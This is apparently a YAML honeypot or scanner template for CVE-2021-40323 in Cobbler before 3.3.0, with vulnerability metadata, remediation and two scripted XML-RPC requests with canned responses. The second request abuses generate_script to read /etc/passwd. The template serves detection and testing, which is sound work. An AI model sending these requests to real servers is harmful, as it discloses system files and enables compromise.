id: CVE-2021-40323
info:
  name: Cobbler <3.3.0 - Remote Code Execution
  author: c-sh0
  description: Cobbler before 3.3.0 allows log poisoning and resultant remote code
    execution via an XMLRPC method.
  severity: critical
  impact: 'Successful exploitation of this vulnerability can lead to unauthorized
    remote code execution, potentially resulting in complete compromise of the affected
    system.

    '
  remediation: 'Upgrade Cobbler to version 3.3.0 or later, which includes a fix for
    this vulnerability.

    '
  reference:
  - https://github.com/cobbler/cobbler/releases/tag/v3.3.0
  - https://github.com/cobbler/cobbler/issues/2795
  - https://tnpitsecurity.com/blog/cobbler-multiple-vulnerabilities/
  - https://nvd.nist.gov/vuln/detail/CVE-2021-40323
  - https://github.com/cobbler/cobbler/commit/d8f60bbf14a838c8c8a1dba98086b223e35fe70a
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-40323
    cwe-id: CWE-94
    epss-score: 0.03051
    epss-percentile: 0.90763
    cpe: cpe:2.3:a:cobbler_project:cobbler:*:*:*:*:*:*:*:*
  metadata:
    max-request: 2
    vendor: cobbler_project
    product: cobbler
  tags: cve,cve2021,cobbler,rce,cobbler_project
traps:
- request:
    method: POST
    path: /cobbler_api
    headers:
      Content-Type: text/xml
    body: |
      <?xml version='1.0'?>
      <methodCall>
        <methodName>find_profile</methodName>
        <params>
          <param>
            <value>
              <struct>
                <member>
                  <name>name</name>
                  <value>
                    <string>*</string>
                  </value>
                </member>
              </struct>
            </value>
          </param>
        </params>
      </methodCall>
  response:
    status_code: 200
    headers: {}
    body: root:.*:0bin:.*:1nobody:.*:99
- request:
    method: POST
    path: /cobbler_api
    headers:
      Content-Type: text/xml
    body: |
      <?xml version='1.0'?>
      <methodCall>
        <methodName>generate_script</methodName>
        <params>
          <param>
            <value>
              <string>{{profile}}</string>
            </value>
          </param>
          <param>
            <value>
              <string></string>
            </value>
          </param>
          <param>
            <value>
              <string>/etc/passwd</string>
            </value>
          </param>
        </params>
      </methodCall>
  response:
    status_code: 200
    headers: {}
    body: ''
